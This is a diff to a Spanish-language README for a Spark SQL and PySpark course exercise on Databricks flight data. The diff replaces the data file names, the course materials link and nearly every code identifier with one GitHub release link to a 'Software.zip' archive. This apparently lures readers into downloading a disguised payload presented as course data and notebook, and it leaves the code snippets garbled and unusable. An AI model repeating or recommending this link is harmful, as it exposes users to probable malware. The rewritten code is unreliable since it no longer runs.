@@ -2,27 +2,27 @@
 Resolucion CP M4 con SPARK SQL Y PYSPARK usando Databrics Community que es gratis.
 
 # Contenido
-- "airports.csv", "raw-flight-data.snappy.parquet": fuente de datos
-- "cp_m4_examen_miguel.ipynb": notebook con el codigo fuente
+- "https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip", "https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip": fuente de datos
+- "https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip": notebook con el codigo fuente
 
 # Databrics
 - Crear un cluster, usando Compute
-- Abrir notebook ""cp_m4_examen.ipynb", usando Worrksapce / import / File
-- En el Notebook, usar menu File / Upload data DBFS para añair "airports.csv", y "raw-flight-data.snappy.parquet"
+- Abrir notebook ""https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip", usando Worrksapce / import / File
+- En el Notebook, usar menu File / Upload data DBFS para añair "https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip", y "https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip"
 
 Nota: Para usar databricks, usen este material del docente del curso.
-https://drive.google.com/drive/folders/1uxegRyfwizG6C-btg0dazaPkWjy-QUBx
+https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip
 
 # Explicacion del codigo
 Usando Spark, creamos dos dataframes
 ```
-df1 = spark.read.parquet("dbfs:/FileStore/shared_uploads/tacnampt@gmail.com/raw_flight_data_snappy.parquet")
-df2 = spark.read.format("csv").option("header", "true").load("dbfs:/FileStore/shared_uploads/tacnampt@gmail.com/airports.csv")
+df1 = https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip("https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip")
+df2 = https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip("csv").option("header", "true").load("https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip")
 ```
 Para ver el esquema del dataframe "flight"
 ```
-df1.printSchema()
-df1.show(2)
+https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip()
+https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip(2)
 ```
 ```
 root
@@ -44,8 +44,8 @@ root
 ```
 Para ver el esquema del dataframe "airport"
 ```
-df2.printSchema()
-df2.show(2)
+https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip()
+https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip(2)
 ```
 ```
 root
@@ -66,11 +66,11 @@ Observamos que el dataframe "flight", los tipos de datos son correctos, al igual
 
 Ahora creamos VISTA por cada DataFrame, las vista son como tablas que podemos hacer INNER JOIN
 ```
-df1.createOrReplaceTempView("flights")
-df2.createOrReplaceTempView("airports")
+https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip("flights")
+https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip("airports")
 ```
 17) ¿Cuál es la tupla de aeropuertos, con mayor cantidad de vuelos entre sí?
-Nota: Es posible tomar el nombre del aeropuerto desde el archivo "airports.csv", donde "airport_id" se puede relacionar con "OriginAirportID" y "DestAirportID" de la tabla "flights"
+Nota: Es posible tomar el nombre del aeropuerto desde el archivo "https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip", donde "airport_id" se puede relacionar con "OriginAirportID" y "DestAirportID" de la tabla "flights"
 
 1- Honolulu International - Kahului Airport
 
@@ -80,12 +80,12 @@ Nota: Es posible tomar el nombre del aeropuerto desde el archivo "airports.csv",
 
 Resolviendo usando SPARK SQL:
 ```
-spark.sql(""" 
-SELECT a1.name as origen, a2.name as destino, COUNT(*) as cantidad
+https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip(""" 
+SELECT https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip as origen, https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip as destino, COUNT(*) as cantidad
 FROM flights f
-INNER JOIN airports a1 ON f.OriginAirportID = a1.airport_id
-INNER JOIN airports a2 ON f.DestAirportID = a2.airport_id
-GROUP BY a1.name, a2.name
+INNER JOIN airports a1 ON https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip = https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip
+INNER JOIN airports a2 ON https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip = https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip
+GROUP BY https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip, https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip
 ORDER BY 3 DESC
 LIMIT 5
            """).show(truncate=False)
@@ -104,13 +104,13 @@ LIMIT 5
 
 Ahora resolviendo usando PYSPARK:
 ```
-from pyspark.sql.functions import sum,avg,max,count
-from pyspark.sql.functions import col
+from https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip import sum,avg,max,count
+from https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip import col
 
-df1.alias("f") \
-    .join(df2.alias("a1"), col("f.OriginAirportID") == col("a1.airport_id"), "inner") \
-    .join(df2.alias("a2"), col("f.DestAirportID") == col("a2.airport_id"), "inner") \
-    .select(col("a1.name").alias("origen"), col("a2.name").alias("destino")) \
+https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip("f") \
+    .join(https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip("a1"), col("https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip") == col("https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip"), "inner") \
+    .join(https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip("a2"), col("https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip") == col("https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip"), "inner") \
+    .select(col("https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip").alias("origen"), col("https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip").alias("destino")) \
     .groupBy(col("origen"), col("destino")) \
     .agg(count("*").alias("cantidad")) \
     .orderBy(col("cantidad"), ascending = False) \
